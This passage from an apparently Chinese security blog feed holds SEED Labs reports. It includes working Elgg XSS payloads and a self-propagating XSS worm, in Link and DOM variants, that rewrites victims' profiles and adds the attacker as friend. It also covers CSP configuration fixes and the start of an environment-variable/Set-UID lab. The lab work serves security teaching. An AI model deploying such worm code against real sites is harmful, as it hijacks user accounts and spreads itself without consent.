(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> userName = <span class="string">&quot;&amp;name=&quot;</span> + <span class="built_in">encodeURIComponent</span>(elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> guid = <span class="string">&quot;&amp;guid=&quot;</span> + elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> ts = <span class="string">&quot;&amp;__elgg_ts=&quot;</span> + elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> token = <span class="string">&quot;&amp;__elgg_token=&quot;</span> + elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> des = <span class="string">&quot;&amp;description=&quot;</span> + <span class="built_in">encodeURIComponent</span>(<span class="string">&quot;&lt;p&gt;(つw)つ&lt;/p&gt;&quot;</span>) +</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;&amp;accesslevel[description]=2&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 填好的内容</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> content = token + ts + userName + des + guid;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> samyGuid = <span class="number">59</span>; <span class="comment">// 目标用户 GUID</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> sendurl = <span class="string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span> (elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span> != samyGuid) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> <span class="title class_">Ajax</span> = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, sendurl, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Ajax</span>.<span class="title function_">send</span>(content);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4.登录Alice账号访问Samy主页后，发现Alice的主页内容已被篡改。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131221440.png" alt="image-20251209152351049"></p><p><strong>问题解答</strong></p><p><strong>Q3: Why do we need Line 14? Remove this line, and repeat your attack. Report and explain your observation.</strong></p><p>移除if语句后，每当Samy保存个人资料并返回个人资料页面时，原本用于攻击的JavaScript 代码就会被执行，导致“关于我”部分被修改，原有的攻击脚本也随之消失，这样就无法继续对其他人进行攻击了。因此，必须保留if条件判断，确保只有当目标用户的guid与自己的不同时，才会执行修改操作。</p><h4 id="Task-6-Writing-a-Self-Propagating-XSS-Worm">Task 6: Writing a Self-Propagating XSS Worm</h4><p>要成为真正的蠕虫病毒，恶意 JavaScript 程序必须能够自我传播。也就是说，每当一些人查看受感染的配置文件时，不仅他们的配置文件会被修改，蠕虫病毒也会传播到他们的配置文件中，进一步影响查看这些新感染配置文件的其他人。这样，查看受感染配置文件的人越多，蠕虫的传播速度就越快。这正是萨米蠕虫所使用的机制：在 2005 年 10 月 4 日发布后的短短 20 小时内，就有超过 100 万用户受到影响，使萨米蠕虫成为有史以来传播速度最快的病毒之一。能够实现这一目标的 JavaScript 代码被称为自传播跨站脚本蠕虫。在本任务中，您需要实现这样一种蠕虫，它不仅可以修改受害者的个人资料并将用户 “Samy ”添加为好友，还可以将蠕虫本身的副本添加到受害者的个人资料中，从而将受害者变成攻击者。</p><p>为了实现自我传播，当恶意 JavaScript 修改受害者的配置文件时，它应该将自己复制到受害者的配置文件中。有几种方法可以实现这一目的，我们将讨论两种常见的方法。</p><p><strong>Link</strong> 如果使用 <script> 标记中的 src 属性来包含蠕虫，那么编写自传播蠕虫就会容易得多。我们在任务 1 中讨论过 src 属性，下面给出一个例子。蠕虫可以简单地将下面的 <script> 标记复制到受害者的配置文件中，从而用相同的蠕虫感染配置文件。</p><script type="text/javascript" src="http://www.example.com/xss_worm.js"> </script><p><strong>DOM Approach</strong>: 如果整个 JavaScript 程序（即蠕虫）被嵌入到受感染的配置文件中，要将蠕虫传播到另一个配置文件，蠕虫代码可以使用 DOM API 从网页中获取自身的副本。下面是一个使用 DOM API 的示例。该代码获取自身的一个副本，并将其显示在一个警报窗口中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;worm&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> headerTag = <span class="string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>; </span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> jsCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;worm&quot;</span>).<span class="property">innerHTML</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> tailTag = <span class="string">&quot;&lt;/&quot;</span> + <span class="string">&quot;script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> wormCode = <span class="built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag); </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(jsCode);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>： 在本实验中，您可以尝试 Link 和 DOM 两种方法，但必须使用 DOM 方法，因为它更具挑战性，而且不依赖于外部 JavaScript 代码。 它更具挑战性，而且不依赖外部 JavaScript 代码。</p><p><strong>操作步骤</strong></p><p>任务：用两种方式实现自传播的XSS攻击（蠕虫病毒）</p><ol><li><p>将脚本放在远端，在主页放入带src属性的script标签，这种方法简单，实现代码短</p></li><li><p>直接在主页放脚本，要处理修改的脚本和修改的内容功能一致的问题，相对比较复杂。</p></li></ol><p><strong>方法一：Link Approach</strong></p><p>1.编写worm.js 蠕虫病毒程序。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">window</span>.onload = function () &#123;</span><br><span class="line">    <span class="comment">// Self-propagating worm: add Samy as friend and plant this script tag into the victim&#x27;s profile.</span></span><br><span class="line">    <span class="keyword">var</span> wormTag = &#x27;&lt;script <span class="keyword">type</span>=<span class="string">&quot;text/javascript&quot;</span> id=<span class="string">&quot;worm&quot;</span> src=<span class="string">&quot;http://www.example60.com/worm.js&quot;</span>&gt;&lt;/&#x27; + &#x27;script&gt;&#x27;;</span><br><span class="line">    <span class="keyword">var</span> wormCode = encodeURIComponent(wormTag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userName = <span class="string">&quot;&amp;name=&quot;</span> + encodeURIComponent(elgg.session.user.name);</span><br><span class="line">    <span class="keyword">var</span> guid = <span class="string">&quot;&amp;guid=&quot;</span> + elgg.session.user.guid;</span><br><span class="line">    <span class="keyword">var</span> ts = <span class="string">&quot;&amp;__elgg_ts=&quot;</span> + elgg.security.<span class="keyword">token</span>.__elgg_ts;</span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">token</span> = <span class="string">&quot;&amp;__elgg_token=&quot;</span> + elgg.security.<span class="keyword">token</span>.__elgg_token;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">des</span> = <span class="string">&quot;&amp;description=&quot;</span> + encodeURIComponent(<span class="string">&quot;l(o&#x27;&#x27;o)J&quot;</span>) + wormCode + <span class="string">&quot;&amp;accesslevel[description]=2&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> content = <span class="keyword">token</span> + ts + userName + <span class="keyword">des</span> + guid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> samyGuid = 59;</span><br><span class="line">    <span class="keyword">var</span> profileUrl = <span class="string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> friendUrl = <span class="string">&quot;http://www.seed-server.com/action/friends/add?friend=&quot;</span> + samyGuid + ts + <span class="keyword">token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (elgg.session.user.guid !== samyGuid) &#123;</span><br><span class="line">        <span class="keyword">var</span> addFriend = new XMLHttpRequest();</span><br><span class="line">        addFriend.<span class="keyword">open</span>(<span class="string">&quot;GET&quot;</span>, friendUrl, true);</span><br><span class="line">        addFriend.setRequestHeader(<span class="string">&quot;X-Requested-With&quot;</span>, <span class="string">&quot;XMLHttpRequest&quot;</span>);</span><br><span class="line">        addFriend.send();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> updateProfile = new XMLHttpRequest();</span><br><span class="line">        updateProfile.<span class="keyword">open</span>(<span class="string">&quot;POST&quot;</span>, profileUrl, true);</span><br><span class="line">        updateProfile.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">        updateProfile.send(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>2.查看配置文件找到 <a href="http://www.example60.com">www.example60.com</a> 的文件存储路径。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131222191.png" alt="image-20251209153738903"></p><p>3.将编写的蠕虫病毒 worm.js 拷贝到该路径下。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp worm.js elgg<span class="number">-10.9</span>.<span class="number">0.5</span><span class="symbol">:/var/www/csp/worm</span>.js</span><br></pre></td></tr></table></figure><p>4.在Samy的主页中使用 src 属性链接到该蠕虫病毒</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://www.example60.com/worm.js&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>5.登录Alice 账号进入Samy主页后，发现自己的主页内容已被篡改。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131223611.png" alt="image-20251209160736721"></p><p>方法二：DOM Approach</p><p>1.本方法不利用外部的js文件，直接在网页上撰写功能相同的脚本。在Samy的个人主页撰写下面的代码并保存。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;worm&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 抓取自身脚本的完整 HTML，并编码后植入描述字段，实现自传播</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> scriptEl = <span class="variable language_">document</span>.<span class="property">currentScript</span> || <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;worm&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> wormTag = scriptEl ? scriptEl.<span class="property">outerHTML</span> : <span class="string">&#x27;&lt;script id=&quot;worm&quot; type=&quot;text/javascript&quot; src=&quot;http://www.example60.com/worm.js&quot;&gt;&lt;/&#x27;</span> + <span class="string">&#x27;script&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> wormCode = <span class="built_in">encodeURIComponent</span>(wormTag);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> userName = <span class="string">&quot;&amp;name=&quot;</span> + <span class="built_in">encodeURIComponent</span>(elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> guid = <span class="string">&quot;&amp;guid=&quot;</span> + elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> ts = <span class="string">&quot;&amp;__elgg_ts=&quot;</span> + elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> token = <span class="string">&quot;&amp;__elgg_token=&quot;</span> + elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> des = <span class="string">&quot;&amp;description=&quot;</span> + <span class="built_in">encodeURIComponent</span>(<span class="string">&quot;Your profile have been attacked!!!&quot;</span>) + wormCode + <span class="string">&quot;&amp;accesslevel[description]=2&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> content = token + ts + userName + des + guid;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> samyGuid = <span class="number">59</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> profileUrl = <span class="string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> friendUrl = <span class="string">&quot;http://www.seed-server.com/action/friends/add?friend=&quot;</span> + samyGuid + ts + token;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span> (elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span> !== samyGuid) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 加好友</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> addFriend = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    addFriend.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, friendUrl, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    addFriend.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;X-Requested-With&quot;</span>, <span class="string">&quot;XMLHttpRequest&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    addFriend.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 更新资料并植入 worm</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> updateProfile = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    updateProfile.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, profileUrl, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    updateProfile.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    updateProfile.<span class="title function_">send</span>(content);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.登录Alice账号访问Samy的主页后发现主页内容已被篡改。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131228871.png" alt="image-20251209161736746"></p><p>3.登录Boby账号访问Alice的主页发现Boby的主页也被篡改了，实现传染功能。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131229857.png" alt="image-20251209161821208"></p><h4 id="Task-7-Defeating-XSS-Attacks-Using-CSP">Task 7: Defeating XSS Attacks Using CSP</h4><p>1.Describe and explain your observations when you visit these websites.<br> 32a 所有都是OK<br> 32b 只有from self 和 from <a href="http://www.example70.com">www.example70.com</a> 是 OK<br> 32c 只有Inline: Nonce (111-111-111), From self, From <a href="http://www.example70.com">www.example70.com</a> 是 OK</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131231157.png" alt="image-20251209161914951"></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131232264.png" alt="image-20251209161945735"></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131233230.png" alt="image-20251209162007853"></p><p>2.Click the button in the web pages from all the three websites, describe and explain your observations.</p><p>32a 的按钮点击后出现弹窗，而32b和32c均没有出现。<br>这是因为在 apache_csp.conf 配置文件中设置了内容安全策略（CSP），这些策略限制了可以执行脚本的来源。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131234262.png" alt="image-20251209162134502"></p><p>3.Change the server configuration on example32b (modify the Apache configuration), so Areas 5 and 6 display OK. Please include your modified configuration in the lab report.</p><p>查看配置文件，发现白名单中没有 <a href="http://example60.com">example60.com</a>，遂加上。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Purpose: Setting CSP policies in Apache configuration</span></span><br><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute">DocumentRoot</span> /var/www/csp</span><br><span class="line">    <span class="attribute">ServerName</span> www.example32b.com</span><br><span class="line">    <span class="attribute">DirectoryIndex</span> index.html</span><br><span class="line">    <span class="attribute">Header</span> set Content-Security-Policy <span class="string">&quot; \</span></span><br><span class="line"><span class="string">             default-src &#x27;self&#x27;; \</span></span><br><span class="line"><span class="string">                         script-src &#x27;self&#x27; *.example70.com www.example60.com \</span></span><br><span class="line"><span class="string">           &quot;</span></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><p>进入/etc/apache2/sites-available 下的apache_csp.conf修改，加上*.example60.com</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131235147.png" alt="image-20251209162707044"></p><p>重启apache2服务</p><p><a href="http://xn--example32b-t31qm38p.com">刷新example32b.com</a>,可以看到完成要求。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131236035.png" alt="image-20251209163355437"></p><p>4.Change the server configuration on example32c (modify the PHP code), so Areas 1, 2, 4, 5, and 6 all display OK. Please include your modified configuration in the lab report.</p><p>查看配置文件phpindex.php 发现白名单中没有 <a href="http://example60.com">example60.com</a> 和 nonce-222-222-222,遂加上。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$cspheader</span> = <span class="string">&quot;Content-Security-Policy:&quot;</span>.</span><br><span class="line">               <span class="string">&quot;default-src &#x27;self&#x27;;&quot;</span>.</span><br><span class="line">               <span class="string">&quot;script-src &#x27;self&#x27; &#x27;nonce-111-111-111&#x27; &#x27;nonce-222-222-222&#x27; *.example70.com *.example60.com&quot;</span>.</span><br><span class="line">               <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="variable">$cspheader</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="string">&#x27;index.html&#x27;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>前往/var/www/csp 中修改 phpindex.php 。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp /home/seed/<span class="title class_">Desktop</span>/<span class="title class_">Labsetup</span>/image_www/csp/phpindex.php elgg<span class="number">-10.9</span>.<span class="number">0.5</span><span class="symbol">:/var/www/csp/phpindex</span>.php</span><br></pre></td></tr></table></figure><p>重启 apache2 服务。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> exec elgg-<span class="number">10.9.0.5</span> service apache2 restart</span><br></pre></td></tr></table></figure><p>刷新网页，完成要求。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131236869.png" alt="image-20251209163744099"></p><ol start="5"><li>Please explain why CSP can help prevent Cross-Site Scripting attacks.</li></ol><p>内容安全策略（CSP）通过设定一系列的限制，对网页可以加载的资源类型和来源进行了严格的规定，这包括但不限于JavaScript脚本、CSS样式表、图片等资源，以及它们可以被加载的URL。当一个网络应用实施了一套严格的CSP 策略后，即便是发现了XSS漏洞的攻击者，也将面临无法迫使用户的浏览器执行其注入的恶意脚本的困境。通常情况下，CSP仅允许执行那些附有正确nonce （一次性标识符）的脚本，而这个标识符是随机生成的，攻击者几乎不可能预测到正确的值，因此也就无法成功地将恶意脚本注入到用户的浏览器中执行。这种机制极大地增强了网页的安全性，防止了恶意脚本的执行，从而有效抵御了跨站脚本攻击。</p>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seed-Labs </tag>
            
            <tag> XSS </tag>
            
            <tag> Web Security </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Seed-Labs 2.0】Environment Variable and Set-UID Program Lab</title>
      <link href="/posts/83dcefb7.html"/>
      <url>/posts/83dcefb7.html</url>
      
        <content type="html"><![CDATA[<h2 id="【Seed-Labs-2-0】Environment-Variable-and-Set-UID-Program-Lab">【Seed-Labs 2.0】Environment Variable and Set-UID Program Lab</h2><h3 id="一、实验目的">一、实验目的</h3><ol><li><p>了解环境变量如何工作，如何对环境变量进行操作</p></li><li><p>父进程创建子进程时，环境变量如何继承</p></li><li><p>环境变量如何影响系统和程序的行为</p></li><li><p>fork、exceve、system三者的功能，并观察不同现象</p></li><li><p>Set-UID程序的行为</p></li><li><p>环境变量与Set-UID程序中存在的安全问题（如权限泄露）</p></li><li><p>动态链接器的保护机制</p></li></ol><h3 id="二、实验步骤与结果">二、实验步骤与结果</h3><h4 id="（一）Task-1：管理环境变量">（一）Task 1：管理环境变量</h4><ol><li>使用printenv或者env命令输出环境变量。</li></ol><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132722773.png" alt="image-20251118150825430"></p><ol start="2"><li>输出特定的环境变量（以PWD为例）</li></ol><p>（1）printenv PWD方法</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132722835.png" alt="image-20251118150922570"></p><p>（2）env | grep PWD方法</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132722894.png" alt="image-20251118150951642"></p><ol start="3"><li>使用unset命令删除环境变量（以PWD为例）</li></ol><p>当使用unset命令删除PWD环境变量后，我们使用printenv方法输出PWD环境变量，发现为空</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132722939.png" alt="image-20251118151024860"></p><ol start="4"><li>使用export命令设置环境变量（以PWD为例）</li></ol><p>当使用export命令设置PWD后，我们输出PWD环境变量</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132723038.png" alt="image-20251118151153260"></p><h4 id="（二）Task-2：将环境变量从父进程传递给子进程">（二）Task 2：将环境变量从父进程传递给子进程</h4><ol><li>实验目的及原理</li></ol><p>目的：研究子进程如何从父进程中获取其环境变量</p><p>原理：Unix中，fork()函数会通过系统调用创建一个与父进程几乎完全相同的子进程，fork()函数会有两个返回值，在父进程中返回子进程的ID；在子进程中返回0，若出现错误则返回一个负值。</p><p>使用man命令查看fork()函数的功能</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132723074.png" alt="image-20251118151258574"></p><ol start="2"><li>示例代码的解释</li></ol><p>Switch()语句中的条件，使用fork()函数创建了一个子进程，但是这里fork()函数会返回两个值：0和子进程的ID号，所以在下面通过注释掉一个printenv()，另一个一定会执行；printenv()函数，用来输出此时的环境变量。</p><ol start="3"><li>Step 1：编译并运行示例代码，输出子进程的环境变量</li></ol><p>（1）使用vim编辑器编写程序task2.c</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printenv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (environ[i] != <span class="literal">NULL</span>) </span><br><span class="line">   &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, environ[i]);</span><br><span class="line">    i++;</span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> childPid;</span><br><span class="line">    <span class="keyword">switch</span>(childPid = fork())</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">/* child process */</span></span><br><span class="line">        <span class="built_in">printenv</span>(); </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">//printenv(); /* parent process */</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）编译运行程序，并将结果保存在child.txt文件中</p><p>编译C文件为可执行文件：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 